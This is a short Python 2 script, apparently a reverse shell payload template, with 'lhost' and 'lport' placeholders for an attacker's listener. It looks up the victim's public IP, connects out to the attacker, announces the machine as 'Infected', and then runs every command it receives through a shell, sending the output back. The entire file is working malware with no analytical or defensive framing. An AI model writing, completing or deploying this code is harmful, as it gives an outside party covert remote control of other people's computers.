#coding:utf-8

import socket
import subprocess
import os
from datetime import datetime
import json
import time
from platform import platform
from platform import system
from platform import version
from platform import machine
import urllib2

HOST = 'lhost'
PORT = lport

os_plat = system()
os_ver = version()
os_arch = machine()
t = datetime.now()
t1 = t.strftime('{%H:%M:%S}')
retip = json.load(urllib2.urlopen('http://jsonip.com'))['ip']
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send(t1+' Infected => '+retip+'\n')

while True:
    try:
        data = s.recv(4096)

        if data.startswith('exit')==True:
            break
        
        else:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = cmd.stdout.read() + cmd.stderr.read()
            s.sendall(out)
    
    except:
        pass

s.send('Exiting\n')
s.close()